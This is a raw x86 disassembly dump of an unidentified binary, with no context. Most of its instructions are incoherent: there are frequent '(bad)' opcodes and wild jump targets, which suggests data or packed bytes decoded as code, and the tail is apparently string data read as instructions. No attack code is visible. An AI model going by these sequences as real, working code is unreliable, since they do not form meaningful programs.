  42a647:	add    BYTE PTR [ebp-0x75],cl
  42a64a:	mov    esi,eax
  42a64c:	xor    eax,DWORD PTR [eax]
  42a64e:	mov    al,bh
  42a650:	or     eax,0x487284
  42a655:	xor    al,cl
  42a657:	mov    ecx,DWORD PTR [ebp-0x4]
  42a65a:	mov    ecx,edi
  42a65c:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a662:	jb     0x42a673
  42a664:	add    BYTE PTR [edi],dh
  42a666:	enter  0x8500,0x8b
  42a66a:	add    ah,bl
  42a66c:	add    BYTE PTR [eax],al
  42a66e:	inc    ebp
  42a66f:	(bad)  
  42a670:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  42a677:	mov    esi,DWORD PTR [edx-0x4]
  42a67a:	add    bh,cl
  42a67c:	dec    ebp
  42a67d:	mov    dh,0x8b
  42a67f:	add    esi,DWORD PTR [ebx]
  42a681:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  42a687:	add    BYTE PTR [eax],al
  42a689:	mov    eax,ecx
  42a68b:	loopne 0x42a6da
  42a68d:	add    BYTE PTR [ebx-0x757bcc39],cl
  42a693:	dec    eax
  42a694:	or     eax,0x8b7232
  42a699:	in     al,0xc1
  42a69b:	or     DWORD PTR [ebp-0x31],ecx
  42a69e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  42a6a5:	xor    dh,BYTE PTR [edx-0x75]
  42a6a8:	add    al,dh
  42a6aa:	enter  0x4f09,0xcf
  42a6ae:	inc    ebp
  42a6af:	mov    WORD PTR [ebx-0x75cdccb8],cs
  42a6b5:	or     al,BYTE PTR ds:0xe4728b
  42a6bb:	or     DWORD PTR [ebp-0x31],ecx
  42a6be:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  42a6c5:	cmp    dh,BYTE PTR [edx+0xf]
  42a6c8:	add    bl,dl
  42a6ca:	rol    DWORD PTR [eax],0x4d
  42a6cd:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  42a6d3:	(bad)  
  42a6d4:	or     eax,0x487284
  42a6d9:	xor    al,cl
  42a6db:	mov    ecx,DWORD PTR [ebp-0x20]
  42a6de:	mov    ecx,DWORD PTR [ecx]
  42a6e0:	xor    ecx,edi
  42a6e2:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42a6e9:	xor    cl,al
  42a6eb:	mov    ecx,DWORD PTR [edi]
  42a6ed:	fadd   QWORD PTR [ebp+0x9]
  42a6f0:	call   0xffcfa1c4
  42a6f5:	dec    eax
  42a6f6:	dec    ebp
  42a6f7:	xor    bh,BYTE PTR [ebx]
  42a6f9:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42a6fd:	loopne 0x42a6fb
  42a6ff:	or     edi,eax
  42a701:	iret   
  42a702:	ret    
  42a703:	mov    WORD PTR [ebp+0x4c],es
  42a706:	mov    esi,DWORD PTR [edx]
  42a708:	call   0x84526e47
  42a70d:	(bad)  
  42a70e:	cwde   
  42a70f:	add    BYTE PTR [edx],dh
  42a711:	mov    esi,DWORD PTR [ebx]
  42a713:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a719:	test   BYTE PTR [ebx],dh
  42a71b:	dec    eax
  42a71c:	add    esi,DWORD PTR [edx]
  42a71e:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a724:	dec    edi
  42a726:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a72d:	xor    al,BYTE PTR [ebx]
  42a72f:	mov    edi,DWORD PTR [ebx]
  42a731:	in     al,0x75
  42a733:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a739:	dec    eax
  42a73a:	xor    esi,DWORD PTR [edx]
  42a73c:	lea    ecx,[edx]
  42a73e:	or     BYTE PTR [ebx+0x900f072],cl
  42a744:	ja     0x42a715
  42a746:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a74d:	cmp    ch,al
  42a74f:	jne    0x42a744
  42a751:	mov    edi,edi
  42a753:	fadd   QWORD PTR [ebp+0x0]
  42a756:	mov    eax,edi
  42a758:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a75f:	mov    edx,DWORD PTR [ebx]
  42a761:	in     al,0x45
  42a763:	or     DWORD PTR [ebx],esi
  42a765:	iret   
  42a766:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a76d:	xor    dl,BYTE PTR [eax-0x75]
  42a770:	sbb    al,ah
  42a772:	dec    DWORD PTR [ecx]
  42a774:	mov    ecx,edi
  42a776:	in     al,dx
  42a777:	mov    eax,es
  42a779:	dec    eax
  42a77a:	mov    DWORD PTR [edx],esi
  42a77c:	fmul   QWORD PTR [edx]
  42a77e:	jne    0x42a70b
  42a780:	(bad)  
  42a781:	(bad)  
  42a783:	or     DWORD PTR [ebp-0x31],eax
  42a786:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a78d:	cmp    bh,bh
  42a78f:	jne    0x42a7d6
  42a791:	lea    ecx,[ebx-0x38372750]
  42a797:	inc    ebx
  42a799:	mov    eax,ecx
  42a79b:	mov    eax,0xa00c111
  42a7a0:	jne    0x42a7e7
  42a7a2:	mov    esi,DWORD PTR [ebx]
  42a7a4:	test   al,0x3
  42a7a6:	inc    ebp
  42a7a7:	mov    DWORD PTR [eax-0xc],edx
  42a7aa:	fiadd  WORD PTR [ebp-0x1]
  42a7ad:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a7b3:	jb     0x42a7b6
  42a7b5:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a7bb:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a7c1:	retf   
  42a7c2:	mov    edx,ecx
  42a7c4:	adc    al,0x84
  42a7c6:	(bad)  
  42a7c7:	std    
  42a7c8:	ret    
  42a7c9:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a7cf:	hlt    
  42a7d0:	rol    edi,0x82
  42a7d3:	ret    
  42a7d4:	cld    
  42a7d5:	enter  0x11ff,0x45
  42a7d9:	inc    ebp
  42a7da:	pop    edi
  42a7db:	mov    ebx,DWORD PTR [ebx+0x14]
  42a7de:	ret    0xc7
  42a7e1:	test   BYTE PTR [ebx+0x45325198],cl
  42a7e7:	jmp    0x42a774
  42a7e9:	push   0x8
  42a7eb:	call   DWORD PTR [esi]
  42a7ed:	in     al,dx
  42a7ee:	add    BYTE PTR [ebp+0x1],0x50
  42a7f2:	add    bl,ah
  42a7f4:	add    bh,bh
  42a7f6:	icebp  
  42a7f7:	mov    ecx,DWORD PTR [eax]
  42a7f9:	cld    
  42a7fa:	pop    es
  42a7fb:	dec    ebp
  42a7fc:	shl    DWORD PTR [ebx],0x72
  42a7ff:	add    eax,DWORD PTR [eax]
  42a801:	cmp    edx,ecx
  42a803:	je     0x42a815
  42a805:	mov    esi,DWORD PTR [ebp-0x4]
  42a808:	inc    edi
  42a80a:	or     al,0xc3
  42a80c:	jmp    FWORD PTR [edx-0x18]
  42a80f:	(bad)  
  42a810:	sti    
  42a811:	cwde   
  42a812:	(bad)  
  42a813:	call   0xffa0a11e
  42a818:	or     al,0x45
  42a81a:	push   ebp
  42a81b:	sub    esp,0x18
  42a81e:	push   ebx
  42a81f:	inc    ebp
  42a820:	mov    edi,edi
  42a822:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a829:	test   al,0x50
  42a82b:	inc    ebp
  42a82c:	push   ecx
  42a82d:	push   eax
  42a82e:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a834:	add    ah,bh
  42a836:	(bad)  
  42a837:	dec    ebp
  42a838:	add    DWORD PTR [ebx],esi
  42a83a:	inc    ebp
  42a83b:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a841:	push   0xffffff8b
  42a843:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a849:	add    eax,DWORD PTR [ecx]
  42a84b:	or     BYTE PTR [eax],al
  42a84d:	call   0xff84a052
  42a852:	mov    eax,DWORD PTR [ebp+0x14]
  42a855:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a85b:	inc    ebp
  42a85c:	dec    ecx
  42a85d:	add    ebp,DWORD PTR [edx+0x14]
  42a860:	push   0x8b3045
  42a865:	call   0x33acf5da
  42a86a:	inc    DWORD PTR [ebx]
  42a86c:	mov    DWORD PTR [edi],ecx
  42a86e:	mov    eax,ecx
  42a870:	or     BYTE PTR [ebp-0x3d],cl
  42a873:	cmp    eax,edi
  42a875:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a87a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a880:	adc    al,0xc9
  42a882:	inc    ebp
  42a883:	adc    BYTE PTR [eax+0x55],dl
  42a886:	jne    0x42a874
  42a888:	call   0xff53a818
  42a88d:	dec    ebp
  42a88e:	inc    ebp
  42a88f:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a895:	add    BYTE PTR [ebx],bh
  42a897:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a89b:	push   eax
  42a89c:	or     al,0x51
  42a89e:	dec    ebp
  42a89f:	xor    DWORD PTR [ebx],0xf320398
  42a8a5:	cmp    eax,DWORD PTR [ebp+0x74]
  42a8a8:	mov    edi,edi
  42a8aa:	pop    edi
  42a8ab:	adc    BYTE PTR [ebx+0x75],bl
  42a8ae:	ret    0x50
  42a8b1:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a8b5:	(bad)  
  42a8b6:	clc    
  42a8b7:	mov    esp,ebp
  42a8b9:	pop    ecx
  42a8ba:	mov    ecx,0xf80085c2
  42a8bf:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a8c2:	push   esi
  42a8c3:	push   esi
  42a8c4:	(bad)  
  42a8c5:	lock add DWORD PTR [ebp+0x44],eax
  42a8c9:	mov    edx,DWORD PTR [eax]
  42a8cb:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a8cf:	or     BYTE PTR [eax+0x7],dl
  42a8d2:	push   ecx
  42a8d3:	ret    
  42a8d4:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a8da:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a8e0:	or     al,0x80
  42a8e2:	jge    0x42a8e5
  42a8e4:	mov    DWORD PTR [eax],eax
  42a8e6:	and    al,0x8
  42a8e8:	cmp    DWORD PTR [ebp+0x10],eax
  42a8eb:	mov    edx,DWORD PTR [esi]
  42a8ed:	xchg   esp,eax
  42a8ee:	dec    esp
  42a8ef:	add    BYTE PTR [eax],dl
  42a8f1:	mov    ecx,edx
  42a8f3:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a8f7:	dec    ebp
  42a8f8:	into   
  42a8f9:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a8ff:	mov    edx,DWORD PTR [eax+0x14]
  42a902:	das    
  42a903:	add    al,0x45
  42a905:	add    BYTE PTR [ebp+0x0],dh
  42a908:	mov    edi,edi
  42a90a:	and    al,0x50
  42a90c:	mov    eax,DWORD PTR [eax]
  42a90e:	and    al,0xd1
  42a910:	xor    eax,DWORD PTR [esi]
  42a912:	lea    eax,[ebp+0x8]
  42a915:	xor    esi,DWORD PTR [edx+0x3]
  42a918:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a91e:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a924:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a92e:	cmp    edi,edi
  42a930:	pushf  
  42a931:	mov    edi,edi
  42a933:	or     BYTE PTR [esi+ecx*1],cl
  42a936:	jne    0x42a8fb
  42a938:	call   0xba904
  42a93d:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a941:	mov    ebx,DWORD PTR [eax]
  42a943:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a947:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a94f:	pop    esi
  42a950:	dec    ecx
  42a952:	and    al,0x10
  42a954:	call   DWORD PTR [ebp+0x24]
  42a957:	in     al,dx
  42a958:	call   0xffc6a841
  42a95d:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a961:	pushf  
  42a962:	pop    esi
  42a963:	mov    ebp,esp
  42a965:	and    al,0xc2
  42a967:	push   edi
  42a968:	add    BYTE PTR [ecx+0x3a],al
  42a96b:	mov    DWORD PTR [ebp+0x24],esi
  42a96e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a974:	dec    DWORD PTR [eax]
  42a976:	and    al,0x7
  42a978:	(bad)  
  42a979:	cli    
  42a97a:	and    al,0x98
  42a97c:	or     BYTE PTR [edx],dh
  42a97e:	sbb    BYTE PTR [ebx],al
  42a980:	adc    al,0x89
  42a982:	jmp    DWORD PTR [esp]
  42a985:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a98b:	adc    al,0x8
  42a98d:	dec    ebp
  42a98e:	adc    BYTE PTR [ebp-0x7c],dh
  42a991:	mov    esi,DWORD PTR [edx]
  42a993:	and    al,0x24
  42a995:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a99b:	add    edi,eax
  42a99d:	pcmpeqb mm1,mm2
  42a9a0:	jmp    0x42a9ee
  42a9a2:	dec    DWORD PTR [eax]
  42a9a4:	je     0x42a991
  42a9a6:	mov    edi,DWORD PTR [ecx]
  42a9a8:	pop    ebp
  42a9a9:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a9ad:	cwde   
  42a9ae:	mov    DWORD PTR [eax-0x8],ebp
  42a9b1:	jge    0x42aa1b
  42a9b3:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a9b9:	jl     0x42aa05
  42a9bb:	adc    BYTE PTR [eax],al
  42a9bd:	pop    esp
  42a9be:	cmp    al,0x10
  42a9c0:	add    BYTE PTR [ecx+0x41],dl
  42a9c3:	adc    BYTE PTR [eax],al
  42a9c5:	test   al,0x21
  42a9c7:	adc    BYTE PTR [eax],al
  42a9c9:	cs jbe 0x42a9dc
  42a9cc:	add    BYTE PTR [edx+0xe],ch
  42a9cf:	adc    BYTE PTR [eax],al
  42a9d1:	clc    
  42a9d2:	pusha  
  42a9d3:	adc    BYTE PTR [eax],al
  42a9d5:	jp     0x42aa18
  42a9d7:	adc    BYTE PTR [eax],al
  42a9d9:	mov    ds:0x88001059,eax
  42a9de:	pop    ebp
  42a9df:	adc    BYTE PTR [eax],al
  42a9e1:	inc    ax
  42a9e3:	adc    BYTE PTR [eax],al
  42a9e5:	mov    ecx,0xbd0042a9
  42a9ea:	test   eax,0xa9c10042
  42a9ef:	inc    edx
  42a9f0:	add    ch,al
  42a9f2:	test   eax,0xa9c90042
  42a9f7:	inc    edx
  42a9f8:	add    ch,cl
  42a9fa:	test   eax,0xa9d10042
  42a9ff:	inc    edx
  42aa00:	add    ch,dl
  42aa02:	test   eax,0xa9d90042
  42aa07:	inc    edx
  42aa08:	add    ch,bl
  42aa0a:	test   eax,0xa9e10042
  42aa0f:	inc    edx
  42aa10:	add    cl,dl
  42aa12:	cmp    BYTE PTR [eax],dl
  42aa14:	add    BYTE PTR [edi],dl
  42aa16:	xor    BYTE PTR [eax],dl
  42aa18:	add    BYTE PTR [eax],al
  42aa1a:	pop    ds
  42aa1b:	adc    BYTE PTR [eax],al
  42aa1d:	(bad)  
  42aa1e:	adc    BYTE PTR ds:[eax],al
  42aa21:	in     eax,0x19
  42aa23:	adc    BYTE PTR [eax],al
  42aa25:	bound  ebx,QWORD PTR [ecx]
  42aa27:	adc    BYTE PTR [eax],al
  42aa29:	shl    BYTE PTR [edi+0x10],1
  42aa2c:	add    BYTE PTR [edi+0x11001057],al
  42aa32:	stos   BYTE PTR es:[edi],al
  42aa33:	inc    edx
  42aa34:	add    BYTE PTR ds:0x190042aa,dl
  42aa3a:	stos   BYTE PTR es:[edi],al
  42aa3b:	inc    edx
  42aa3c:	add    BYTE PTR ds:0x210042aa,bl
  42aa42:	stos   BYTE PTR es:[edi],al
  42aa43:	inc    edx
  42aa44:	add    BYTE PTR ds:0x290042aa,ah
  42aa4a:	stos   BYTE PTR es:[edi],al
  42aa4b:	inc    edx
  42aa4c:	add    BYTE PTR ds:0xe20042aa,ch
  42aa52:	adc    BYTE PTR ds:[eax],al
  42aa55:	ds pop ebp
  42aa57:	adc    BYTE PTR [eax],al
  42aa59:	add    BYTE PTR [esi+0x10],ah
  42aa5c:	add    al,ch
  42aa5e:	pop    eax
  42aa5f:	adc    BYTE PTR [eax],al
  42aa61:	cdq    
  42aa62:	outs   dx,BYTE PTR ds:[esi]
  42aa63:	adc    BYTE PTR [eax],al
  42aa65:	ja     0x42aac7
  42aa67:	adc    BYTE PTR [eax],al
  42aa69:	jne    0x42aaa2
  42aa6b:	adc    BYTE PTR [eax],al
  42aa6d:	arpl   WORD PTR [eax+edx*1],bx
  42aa70:	add    BYTE PTR [ecx-0x56],dl
  42aa73:	inc    edx
  42aa74:	add    BYTE PTR [ebp-0x56],dl
  42aa77:	inc    edx
  42aa78:	add    BYTE PTR [ecx-0x56],bl
  42aa7b:	inc    edx
  42aa7c:	add    BYTE PTR [ebp-0x56],bl
  42aa7f:	inc    edx
  42aa80:	add    BYTE PTR [ecx-0x56],ah
  42aa83:	inc    edx
  42aa84:	add    BYTE PTR [ebp-0x56],ah
  42aa87:	inc    edx
  42aa88:	add    BYTE PTR [ecx-0x56],ch
  42aa8b:	inc    edx
  42aa8c:	add    BYTE PTR [ebp-0x56],ch
  42aa8f:	inc    edx
  42aa90:	add    BYTE PTR [ecx+edx*1+0x10],bl
  42aa94:	add    BYTE PTR [ebp+edx*2+0x9fe0010],bl
  42aa9b:	adc    BYTE PTR [eax],al
  42aa9d:	and    al,0x30
  42aa9f:	adc    BYTE PTR [eax],al
  42aaa1:	ret    
  42aaa2:	pop    edi
  42aaa3:	adc    BYTE PTR [eax],al
  42aaa5:	loopne 0x42ab0d
  42aaa7:	adc    BYTE PTR [eax],al
  42aaa9:	add    eax,0xd400105b
  42aaae:	aas    
  42aaaf:	adc    BYTE PTR [eax],al
  42aab1:	xchg   ecx,eax
  42aab2:	stos   BYTE PTR es:[edi],al
  42aab3:	inc    edx
  42aab4:	add    BYTE PTR [ebp-0x66ffbd56],dl
  42aaba:	stos   BYTE PTR es:[edi],al
  42aabb:	inc    edx
  42aabc:	add    BYTE PTR [ebp-0x5effbd56],bl
  42aac2:	stos   BYTE PTR es:[edi],al
  42aac3:	inc    edx
  42aac4:	add    BYTE PTR [ebp-0x56ffbd56],ah
  42aaca:	stos   BYTE PTR es:[edi],al
  42aacb:	inc    edx
  42aacc:	add    BYTE PTR [ebp-0x29ffbd56],ch
  42aad2:	sbb    eax,0x10f00010
  42aad7:	adc    BYTE PTR [eax],al
  42aad9:	inc    ecx
  42aada:	bound  edx,QWORD PTR [eax]
  42aadc:	add    BYTE PTR [ebx+eax*1],ah
  42aadf:	adc    BYTE PTR [eax],al
  42aae1:	jecxz  0x42ab46
  42aae3:	adc    BYTE PTR [eax],al
  42aae5:	pushf  
  42aae6:	xor    DWORD PTR [eax],edx
  42aae8:	add    BYTE PTR [ecx],al
  42aaea:	or     dl,BYTE PTR [eax]
  42aaec:	add    dh,dl
  42aaee:	inc    edi
  42aaef:	adc    BYTE PTR [eax],al
  42aaf1:	shr    DWORD PTR [edx-0x552affbe],1
  42aaf7:	inc    edx
  42aaf8:	add    cl,bl
  42aafa:	stos   BYTE PTR es:[edi],al
  42aafb:	inc    edx
  42aafc:	add    ch,bl
  42aafe:	stos   BYTE PTR es:[edi],al
  42aaff:	inc    edx
  42ab00:	add    cl,ah
  42ab02:	stos   BYTE PTR es:[edi],al
  42ab03:	inc    edx
  42ab04:	add    ch,ah
  42ab06:	stos   BYTE PTR es:[edi],al
  42ab07:	inc    edx
  42ab08:	add    cl,ch
  42ab0a:	stos   BYTE PTR es:[edi],al
  42ab0b:	inc    edx
  42ab0c:	add    ch,ch
  42ab0e:	stos   BYTE PTR es:[edi],al
  42ab0f:	inc    edx
  42ab10:	add    BYTE PTR [ebx+0x32],al
  42ab13:	xor    dh,BYTE PTR ds:0x5a52345f
  42ab19:	push   esp
  42ab1a:	xor    BYTE PTR [esi],dh
  42ab1c:	add    BYTE PTR [ecx+0x36],cl
  42ab1f:	push   eax
  42ab20:	pop    edi
  42ab21:	ss inc ebx
  42ab23:	ss pop edx
  42ab25:	xor    ebx,DWORD PTR [edi+0x52]
  42ab28:	add    BYTE PTR [edi+ecx*2+0x32],dl
  42ab2c:	pop    edi
  42ab2d:	dec    esi
  42ab2e:	dec    esp
  42ab2f:	dec    eax
  42ab30:	xor    esi,DWORD PTR [edx]
  42ab32:	pop    edi
  42ab33:	xor    al,0x4b
  42ab35:	add    BYTE PTR [eax+0x49],cl
  42ab38:	push   ebp
  42ab39:	xor    al,0x5f
  42ab3b:	dec    esp
  42ab3c:	inc    edx
  42ab3d:	dec    ecx
  42ab3e:	cmp    DWORD PTR [edi+ebx*2],esi
  42ab41:	pop    ecx
  42ab42:	inc    edi
  42ab43:	add    BYTE PTR [eax+0x50],bl
  42ab46:	dec    eax
  42ab47:	pop    edi
  42ab48:	push   ebp
  42ab49:	push   ecx
  42ab4a:	inc    edi
  42ab4b:	xor    cl,BYTE PTR [edx+0x38]
  42ab4e:	push   esi
  42ab4f:	add    BYTE PTR [ebx+0x4a],al
  42ab52:	push   edx
  42ab53:	pop    edi
  42ab54:	dec    edi
  42ab55:	dec    eax
  42ab56:	dec    edi
  42ab57:	dec    edi
  42ab58:	dec    edx
  42ab59:	add    BYTE PTR [ecx+0x52],al
  42ab5c:	cmp    DWORD PTR [edi+0x56],ebx
  42ab5f:	aaa    
  42ab60:	dec    esp
  42ab61:	cmp    DWORD PTR [ebx+0x5f],eax
  42ab64:	push   edx
  42ab65:	inc    esp
  42ab66:	add    BYTE PTR [ecx+0x37],bl
  42ab69:	inc    esp
  42ab6a:	pop    edi
  42ab6b:	dec    ecx
  42ab6c:	xor    esi,DWORD PTR [edi]
  42ab6e:	xor    DWORD PTR [edi+0x49],ebx
  42ab71:	push   esp
  42ab72:	xor    eax,DWORD PTR [eax]
  42ab74:	push   edx
  42ab75:	xor    BYTE PTR [eax+0x5f],bl
  42ab78:	dec    eax
  42ab79:	push   edi
  42ab7a:	inc    esi
  42ab7b:	xor    DWORD PTR [edi+0x5f],edx
  42ab7e:	cmp    BYTE PTR [ebx+0x37],dl
  42ab81:	add    BYTE PTR [esi+0x42],dl
  42ab84:	dec    ecx
  42ab85:	xor    ebx,DWORD PTR [edi+0x45]
  42ab88:	xor    BYTE PTR [ebp+0x5f],cl
  42ab8b:	xor    al,0x34
  42ab8d:	xor    BYTE PTR [edx+0x5f],cl
  42ab90:	inc    edi
  42ab91:	add    BYTE PTR [edx+0x57],dl
  42ab94:	xor    ebx,DWORD PTR [edi+0x31]
  42ab97:	dec    edx
  42ab98:	push   edi
  42ab99:	xor    eax,0x4d435f
  42ab9e:	dec    ecx
  42ab9f:	xor    eax,0x36365f39
  42aba4:	dec    eax
  42aba5:	xor    BYTE PTR [eax],al
  42aba7:	dec    edi
  42aba8:	inc    ebx
  42aba9:	push   edi
  42abaa:	pop    edi
  42abab:	inc    edi
  42abac:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  42abb1:	add    BYTE PTR [edx+0x58],al
  42abb4:	inc    edi
  42abb5:	ss pop edi
  42abb7:	push   esi
  42abb8:	inc    ebx
  42abb9:	dec    esi
  42abba:	inc    esp
  42abbb:	add    BYTE PTR [edi+0x4d],cl
  42abbe:	inc    edi
  42abbf:	xor    ebx,DWORD PTR [edi+0x34]
  42abc2:	dec    esi
  42abc3:	pop    edx
  42abc4:	cmp    BYTE PTR [edi+0x58],bl
  42abc7:	cmp    BYTE PTR [eax],al
  42abc9:	push   edx
  42abca:	pop    eax
  42abcb:	push   ecx
  42abcc:	pop    edi
  42abcd:	dec    esp
  42abce:	push   edx
  42abcf:	dec    ecx
  42abd0:	dec    edi
  42abd1:	inc    esp
  42abd2:	pop    edi
  42abd3:	dec    edi
  42abd4:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  42abd8:	push   eax
  42abd9:	inc    ebp
  42abda:	pop    edi
  42abdb:	xor    eax,0x565f3945
  42abe0:	add    BYTE PTR [edi+0x4e],al
  42abe3:	push   esi
  42abe4:	pop    edi
  42abe5:	inc    edi
  42abe6:	push   esp
  42abe7:	dec    eax
  42abe8:	xor    dh,BYTE PTR [ecx]
  42abea:	pop    edi
  42abeb:	dec    edi
  42abec:	xor    eax,DWORD PTR ss:[eax]
  42abef:	inc    esp
  42abf0:	inc    ebp
  42abf1:	dec    ecx
  42abf2:	pop    edi
  42abf3:	push   edx
  42abf4:	dec    eax
  42abf5:	xor    al,0x48
  42abf7:	dec    ecx
  42abf8:	ss pop edi
  42abfa:	aaa    
  42abfb:	aaa    
  42abfc:	dec    ecx
  42abfd:	dec    ebp
  42abfe:	add    BYTE PTR [eax+0x54],cl
  42ac01:	ss pop edi
  42ac03:	inc    esi
  42ac04:	inc    edx
  42ac05:	xor    dh,BYTE PTR [eax+eax*1]
  42ac08:	dec    esi
  42ac09:	ss dec edx
  42ac0b:	pop    edi
  42ac0c:	dec    ecx
  42ac0d:	dec    esp
  42ac0e:	inc    edi
  42ac0f:	inc    esp
  42ac10:	dec    eax
  42ac11:	xor    BYTE PTR [eax],bh
  42ac13:	xor    eax,0x4c344f00
  42ac18:	xor    esi,DWORD PTR [edi]
  42ac1a:	xor    BYTE PTR [edi+0x44],bl
  42ac1d:	inc    edi
  42ac1e:	dec    ebx
  42ac1f:	xor    al,BYTE PTR [ecx+0x43]
  42ac22:	add    BYTE PTR [edi+0x32],cl
  42ac25:	xor    ebx,DWORD PTR [edi+0x57]
  42ac28:	xor    cl,BYTE PTR [edi+0x5f]
  42ac2b:	pop    edx
  42ac2c:	add    BYTE PTR [eax+0x4c],bl
  42ac2f:	cmp    DWORD PTR [edi+0x4b],ebx
  42ac32:	inc    ecx
  42ac33:	dec    edx
  42ac34:	inc    esi
  42ac35:	xor    DWORD PTR [edi+ebx*2],esi
  42ac38:	pop    eax
  42ac39:	inc    edi
  42ac3a:	inc    edx
  42ac3b:	add    BYTE PTR [eax+0x33],dl
  42ac3e:	dec    esi
  42ac3f:	pop    edi
  42ac40:	dec    eax
  42ac41:	xor    eax,0x485f53
  42ac46:	dec    ebp
  42ac47:	xor    BYTE PTR [edx+0x5f],al
  42ac4a:	dec    edx
  42ac4b:	pop    eax
  42ac4c:	push   esp
  42ac4d:	dec    ecx
  42ac4e:	dec    esp
  42ac4f:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  42ac53:	xor    esi,DWORD PTR [eax]
  42ac55:	pop    edi
  42ac56:	inc    ecx
  42ac57:	pop    edx
  42ac58:	push   ecx
  42ac59:	pop    edx
  42ac5a:	cmp    DWORD PTR [esi],esi
  42ac5c:	pop    edi
  42ac5d:	dec    eax
  42ac5e:	dec    esp
  42ac5f:	pop    edx
  42ac60:	add    BYTE PTR [ecx+0x57],dl
  42ac63:	pop    ecx
  42ac64:	pop    edi
  42ac65:	push   esi
  42ac66:	xor    al,0x44
  42ac68:	xor    DWORD PTR [eax],edi
  42ac6a:	xor    bl,BYTE PTR [edi+0x39]
  42ac6d:	push   esp
  42ac6e:	push   esp
  42ac6f:	add    BYTE PTR [esi+0x0],dl
  42ac72:	dec    edi
  42ac73:	add    BYTE PTR [edi+0x0],al
  42ac76:	add    BYTE PTR ss:[edi+0x0],bl
  42ac7a:	dec    edi
  42ac7b:	add    BYTE PTR [edx+0x0],bl
  42ac7e:	inc    ebp
  42ac7f:	add    BYTE PTR [eax],dh
  42ac81:	add    BYTE PTR [ebp+0x0],al
  42ac84:	xor    BYTE PTR [eax],al
  42ac86:	pop    edi
  42ac87:	add    BYTE PTR [eax],dh
  42ac89:	add    BYTE PTR ds:0x4f000000,dh
  42ac8f:	add    BYTE PTR ds:0x5f005700,dh
  42ac95:	add    BYTE PTR [edi],dh
  42ac97:	add    BYTE PTR [ebx+0x0],dl
  42ac9a:	push   ebp
  42ac9b:	add    BYTE PTR [edi+0x0],al
  42ac9e:	xor    al,0x0
  42aca0:	pop    edi
  42aca1:	add    BYTE PTR [ecx+0x0],dl
  42aca4:	inc    esp
  42aca5:	add    BYTE PTR [eax],al
  42aca7:	add    BYTE PTR [edx+0x0],dl
  42acaa:	push   esp
  42acab:	add    BYTE PTR ds:0x52005f00,dh
  42acb1:	add    BYTE PTR [edi+0x0],dl
  42acb4:	xor    al,BYTE PTR [eax]
  42acb6:	xor    al,BYTE PTR [eax]
  42acb8:	xor    BYTE PTR [eax],al
  42acba:	xor    BYTE PTR [eax],al
  42acbc:	pop    edi
  42acbd:	add    BYTE PTR [esi],dh
  42acbf:	add    BYTE PTR [eax],al
  42acc1:	add    BYTE PTR [eax+0x0],cl
  42acc4:	inc    ebp
  42acc5:	add    BYTE PTR [eax+eax*1+0x30],cl
  42acc9:	add    BYTE PTR [edi+0x0],bl
  42accc:	dec    edx
  42accd:	add    BYTE PTR [edx],dh
  42accf:	add    BYTE PTR [edi],dh
  42acd1:	add    BYTE PTR [ebp+0x0],dl
  42acd4:	add    BYTE PTR ss:[eax],dh
  42acd7:	add    BYTE PTR [eax],al
  42acd9:	add    BYTE PTR [esi+0x0],dl
  42acdc:	cmp    BYTE PTR [eax],al
  42acde:	dec    edi
  42acdf:	add    BYTE PTR [ecx],bh
  42ace1:	add    BYTE PTR [edi+0x0],bl
  42ace4:	pop    eax
  42ace5:	add    BYTE PTR [edx+0x0],bl
  42ace8:	dec    esp
  42ace9:	add    BYTE PTR [ebx+0x0],cl
  42acec:	add    BYTE PTR [eax],al
  42acee:	dec    ecx
  42acef:	add    BYTE PTR [ebp+0x0],dl
